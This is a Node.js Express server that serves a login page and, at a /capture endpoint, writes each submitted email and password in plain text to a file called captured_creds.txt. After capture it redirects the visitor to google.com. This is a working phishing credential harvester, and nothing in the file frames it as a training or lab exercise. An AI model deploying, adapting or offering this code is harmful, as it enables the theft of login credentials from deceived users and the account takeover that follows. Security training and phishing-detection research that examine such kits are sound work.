const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running and accessible on your network at port ${PORT}`);
});
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Explicitly serve the login page when requested
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Handle form submission and log credentials
app.post('/capture', (req, res) => {
    const { email, password } = req.body;
    const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;

    fs.appendFile('captured_creds.txt', logEntry, (err) => {
        if (err) console.error('Error saving credentials:', err);
        else console.log(`Captured submission for: ${email}`);
    });

    res.redirect('https://www.google.com');
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});